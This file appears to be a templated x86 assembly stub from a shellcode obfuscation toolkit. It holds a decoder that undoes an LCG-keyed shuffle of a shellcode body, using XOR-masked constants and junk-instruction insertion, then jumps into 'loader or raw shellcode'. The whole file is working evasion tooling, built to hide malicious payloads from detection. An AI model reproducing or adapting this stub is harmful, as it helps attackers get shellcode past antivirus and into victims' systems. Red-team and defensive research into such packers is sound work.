.code32

// iji means insert junk instruction
// ijs means insert junk instruction with short version

// {{.Reg.eax}} store the seed
// {{.Reg.ebx}} store the key and multiplier
// {{.Reg.ecx}} store the increment
// {{.Reg.edx}} store the loop times
// {{.Reg.ebp}} store the body address
// {{.Reg.esi}} store the swapped address about i
// {{.Reg.edi}} store the swapped address about j

entry:
  // save context
  pushad                                       {{iji}}
  pushfd                                       {{iji}}

  // load seed and key
  mov {{.Reg.eax}}, {{hex .Seed}}              {{iji}}
  mov {{.Reg.ebx}}, {{hex .Key}}               {{iji}}

  // decrypt increment
  mov {{.Reg.ecx}}, {{hex .Imm.Inc}}           {{iji}}
  xor {{.Reg.ecx}}, {{.Reg.ebx}}               {{iji}}

  // decrypt multiplier and destroy key
  mov {{.Reg.edx}}, {{hex .Imm.Mul}}           {{iji}}
  xor {{.Reg.ebx}}, {{.Reg.edx}}               {{iji}}

  // decrypt the loop time and prevent continuous 0x00
  mov {{.Reg.edx}}, {{hex .NumLoopStub}}       {{iji}}
  xor {{.Reg.edx}}, {{hex .NumLoopMaskA}}      {{iji}}
  xor {{.Reg.edx}}, {{hex .NumLoopMaskB}}      {{iji}}

  // check the loop time is zero
  test {{.Reg.edx}}, {{.Reg.edx}}              {{iji}}
  jz skip_unshuffle                            {{iji}}

  // calculate the body address
  call calc_body_addr
 flag_CEA:                                              {{iji}}
  add {{.Reg.ebp}}, body - flag_CEA + {{hex .OffsetT}}  {{iji}}
  add {{.Reg.ebp}}, {{hex .OffsetA}}                    {{iji}}
  sub {{.Reg.ebp}}, {{hex .OffsetS}}                    {{iji}}

  // unshuffle shellcode body
 loop_unshuffle:
  // seed = seed * multiplier + increment
  imul {{.Reg.eax}}, {{.Reg.ebx}}              {{iji}}
  add {{.Reg.eax}}, {{.Reg.ecx}}               {{iji}}

  // save seed and calculate seed >> 3
  push {{.Reg.eax}}                            {{iji}}
  shr {{.Reg.eax}}, 3                          {{iji}}

  // reserve space for store the div result
  sub esp, 4                                   {{iji}}

  // save context about execute div
  push eax                                     {{iji}}
  push ecx                                     {{iji}}
  push edx                                     {{iji}}

  // calculate seed % (i + 1)
  // push/pop for prevent register conflict
  push {{.Reg.edx}}                            {{iji}}
  push {{.Reg.eax}}                            {{iji}}
  pop eax                                      {{iji}}
  pop ecx                                      {{iji}}
  inc ecx                                      {{iji}}
  xor edx, edx                                 {{iji}}
  div ecx                                      {{iji}}

  // store the div result
  mov [esp + 3*4], edx                         {{iji}}

  // restore context about execute div
  pop edx                                      {{iji}}
  pop ecx                                      {{iji}}
  pop eax                                      {{iji}}

  // calculate the swapped data address
  mov {{.Reg.esi}}, {{.Reg.edx}}               {{iji}}
  add {{.Reg.esi}}, {{.Reg.ebp}}               {{iji}}
  mov {{.Reg.edi}}, [esp]                      {{iji}}
  add {{.Reg.edi}}, {{.Reg.ebp}}               {{iji}}

  // save context about swap data
  push eax                                     {{iji}}
  push esi                                     {{iji}}
  push edi                                     {{iji}}

  // swap data[i] and data[j]
  push {{.Reg.esi}}                            {{iji}}
  push {{.Reg.edi}}                            {{iji}}
  pop edi                                      {{iji}}
  pop esi                                      {{iji}}
  mov al, [esi]                                {{iji}}
  xchg al, [edi]                               {{iji}}
  mov [esi], al                                {{iji}}

  // restore context about swap data
  pop edi                                      {{iji}}
  pop esi                                      {{iji}}
  pop eax                                      {{iji}}

  // restore stack
  add esp, 4                                   {{iji}}

  // restore seed
  pop {{.Reg.eax}}                             {{iji}}

  // update loop counter
  dec {{.Reg.edx}}                             {{iji}}
  jnz loop_unshuffle                           {{iji}}
 skip_unshuffle:

  // restore context
  popfd                                        {{iji}}
  popad                                        {{iji}}

  jmp body                                     {{iji}}

calc_body_addr:
  pop  {{.Reg.ebp}}                            {{iji}}
  push {{.Reg.ebp}}                            {{iji}}
  ret                                          {{iji}}

body:
  // loader or raw shellcode
